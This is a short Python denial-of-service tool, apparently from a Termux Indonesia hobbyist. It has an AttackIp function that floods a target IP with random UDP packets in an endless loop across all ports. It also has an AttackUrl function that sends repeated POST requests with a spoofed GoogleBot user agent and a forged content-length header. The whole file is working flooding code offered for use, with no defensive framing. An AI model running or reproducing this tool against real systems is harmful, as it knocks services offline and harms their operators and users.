import sys
import os
import time
import socket
import random
import requests
from rich.progress import track


from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


"""
Author   : Rio Agung Purnomo
TEAM     : Termux Indonesia
Thanks   : All Member Termux Indonesia
Tingkat  : Programmer & Developer
https://termuxid.dev"
"""

h = {
  "content-length" : "1000000000000000000",
  "connection" : "close",
  "user-agent" : "GoogleBot V3",
  "x-forwarded-from" : "0.0.0.0",
  "content-type" : "application/xml",
  "set-cookie" : "v=xxxxXxxxxxx;&vx=#xxxxxxxxxxxxxxxx0x;;d;"
  }

data = {
  "X" : "xXxxX",
  "Y" : "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
  }

def AttackIp(ip,port):
  for i in track(range(3), description="start up ..."):
    time.sleep(1) 
  sent = 0
  try:
    while True:
      sock.sendto(bytes,(ip,port))
      sent = sent + 1
      port = port + 1
      print("Sent \033[1;32m%s\033[0m packet to \033[1;33m%s\033[0m throught \033[1;33mport:%s\033[0m"%(sent,ip,port))
      if port == 65534:
         port = 1
  except KeyboardInterrupt:
    exit('\n\033[1;33mプログラムを終了します !\033[0m')
  except socket.gaierror:
    exit('\n\033[1;33m the ip you entered is wrong !\033[0m')


def AttackUrl(url,amount=False):
  if amount == False:
    amount = 100
  for i in track(range(1,int(amount)),description='attack process '):
    req = requests.post(url,data=data,headers=h)
    print("Send {}, respon {}".format(i,req.status_code))